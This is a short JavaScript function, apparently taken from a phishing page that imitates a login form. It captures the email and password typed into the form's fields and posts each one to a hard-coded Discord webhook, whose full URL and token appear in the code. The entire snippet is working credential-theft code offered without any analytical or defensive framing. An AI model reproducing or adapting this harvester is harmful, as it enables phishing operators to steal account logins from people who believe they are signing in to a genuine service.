function func() {
    event.preventDefault();
    
    const email = document.querySelector(".inputField-4g7rSQ").value;
    const pass = document.querySelector(".pass").value;
    const whurl = "https://discord.com/api/webhooks/1126221995579809923/2GbmJrwj8lKjMKPcGfeJFgxJZ_KRzvRQbnzVHpAcFb0hxsaXaoC9arWCzU-pulufgiKv"
    fetch(whurl,{
        "method":"POST",
        "headers": {"content-type":"application/json"},
        "body": JSON.stringify({
            "content": email
        })
    })
    fetch(whurl,{
        "method":"POST",
        "headers": {"content-type":"application/json"},
        "body": JSON.stringify({
            "content": pass
        })
    })
}